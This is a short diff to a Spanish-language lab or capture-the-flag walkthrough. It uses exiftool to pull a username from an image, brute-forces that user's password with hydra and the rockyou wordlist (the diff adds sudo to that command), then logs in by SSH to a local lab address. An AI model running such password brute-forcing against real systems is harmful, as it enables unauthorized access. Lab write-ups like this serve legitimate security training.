@@ -14,7 +14,7 @@ usamos la herramienta exiftool
 sudo exiftool imagen.jpeg
 encontramos el usuario
 
-hydra -l borazuwarah -P /usr/share/wordlist/rockyou.txt.gz
+sudo hydra -l borazuwarah -P /usr/share/wordlist/rockyou.txt.gz
 obtenemos la contraseña y entramos por ssh
 
 ssh borazuwarah@172.17.0.2
